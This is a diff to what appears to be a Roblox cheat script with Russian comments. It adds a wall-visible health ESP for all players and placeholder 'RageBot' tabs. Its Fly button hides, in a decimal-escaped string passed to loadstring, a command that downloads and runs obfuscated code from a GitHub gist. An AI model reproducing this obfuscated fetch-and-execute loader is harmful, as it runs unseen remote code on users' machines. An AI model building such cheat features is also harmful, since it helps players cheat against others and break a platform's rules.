@@ -43,6 +43,87 @@ Section:NewButton("Esp button", "i know this esp is shit", function()
     end
 end)
 
+Section:NewButton("ESP Health", "ButtonInfo", function()
+    local Players = game:GetService("Players")
+
+-- Функция для создания текстового отображения здоровья
+local function createHealthDisplay(character)
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        -- Удаляем старый BillboardGui, если он существует
+        local existingGui = character:FindFirstChild("BillboardGui")
+        if existingGui then
+            existingGui:Destroy()
+        end
+
+        -- Создание нового BillboardGui
+        local billboardGui = Instance.new("BillboardGui")
+        billboardGui.Adornee = character:FindFirstChild("Head")
+        billboardGui.Size = UDim2.new(0, 100, 0, 50)
+        billboardGui.StudsOffset = Vector3.new(0, 3, 0) -- Поднимаем текст над головой
+        billboardGui.AlwaysOnTop = true
+        
+        -- Создание текстового метки
+        local healthLabel = Instance.new("TextLabel")
+        healthLabel.Size = UDim2.new(1, 0, 1, 0)
+        healthLabel.BackgroundTransparency = 1
+        healthLabel.TextColor3 = Color3.new(1, 0, 0) -- Красный цвет текста
+        healthLabel.TextScaled = true
+        healthLabel.Parent = billboardGui
+        
+        -- Устанавливаем начальное значение здоровья
+        healthLabel.Text = "Health: " .. math.ceil(humanoid.Health) .. "/" .. humanoid.MaxHealth
+        
+        -- Обновление текста при изменении здоровья
+        humanoid.HealthChanged:Connect(function()
+            healthLabel.Text = "Health: " .. math.ceil(humanoid.Health) .. "/" .. humanoid.MaxHealth
+        end)
+
+        -- Устанавливаем BillboardGui в персонаж
+        billboardGui.Parent = character
+    end
+end
+
+-- Функция для обновления всех персонажей
+local function updateAllDisplays()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Character then
+            createHealthDisplay(player.Character) -- Обновляем отображение здоровья
+        end
+    end
+end
+
+-- Функция обработки добавления персонажа игрока
+local function onCharacterAdded(player)
+    local character = player.Character or player.CharacterAdded:Wait()
+    createHealthDisplay(character)
+
+    -- Обработка перерождения персонажа
+    player.CharacterAdded:Connect(function(newCharacter)
+        createHealthDisplay(newCharacter)
+    end)
+end
+
+-- Подключение к существующим игрокам
+for _, player in ipairs(Players:GetPlayers()) do
+    onCharacterAdded(player)
+end
+
+-- Обработка новых игроков
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function()
+        onCharacterAdded(player)
+    end)
+end)
+
+-- Основной цикл обновления
+while true do
+    updateAllDisplays() -- Обновляем все отображения
+    wait(1) -- Повторяем каждые 1 секунду
+end
+
+end)
+
 local Tab = Window:NewTab("Movement")
 
 local Section = Tab:NewSection("WalkSpeed")
@@ -82,7 +163,7 @@ end)
 local Section = Tab:NewSection("Fly")
 
 Section:NewButton("Fly", ":3", function()
-    print("notfinished")
+    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
 
 end)
 
@@ -93,3 +174,12 @@ local Section = Tab:NewSection("Coming Soon")
 local Tab = Window:NewTab("Credits")
 
 local Section = Tab:NewSection("LuMefch (YT)")
+
+local Tab = Window:NewTab("Yba")
+
+local Section = Tab:NewSection("Not finished yet")
+
+local Tab = Window:NewTab("RageBot")
+
+local Section = Tab:NewSection("Misc")
+
